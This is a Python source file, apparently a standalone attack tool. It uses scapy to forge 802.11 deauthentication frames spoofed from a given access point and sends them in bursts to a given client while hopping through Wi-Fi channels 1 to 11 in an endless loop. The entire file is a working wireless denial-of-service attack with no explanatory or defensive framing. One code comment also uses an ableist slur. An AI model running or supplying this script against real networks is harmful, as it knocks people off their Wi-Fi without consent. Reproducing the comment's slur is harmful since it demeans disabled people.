from scapy.all import *
import sys
import time
import threading
import subprocess
interface = "wlan1"
#ApMAC = '1C:D6:BE:35:6A:EC'
apMAC = sys.argv[1]
clientMAC = sys.argv[2]
packet = RadioTap() / Dot11(type=0, subtype=12, addr1=clientMAC, addr2=apMAC, addr3=apMAC) / Dot11Deauth(reason=7)
def hopChan():
    i = 0
    while True:
        try:
            print(f"Channel no {(i%11)+1} on interface {interface}")
            subprocess.run(["iw", "dev", interface, "set", "channel", str((i%11)+1)], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sendp(packet, iface=interface,  verbose=False, count=100)
            print(f"Finished in channel no {(i%11)+1} on interface {interface}")
            time.sleep(0.5)
            i+=1
        except subprocess.CalledProcessError:
            print(f"Channel switch to {(i%11)+1} failed")

def main(): 
    print(f'Access point: {apMAC} | Host: {clientMAC}') 
    hopperThread = threading.Thread(target=hopChan) 
    hopperThread.daemon = True 
    hopperThread.start() 
    hopperThread.join() # Yeah duh you have to halt the main process, retard.

if __name__ == "__main__": 
    main()
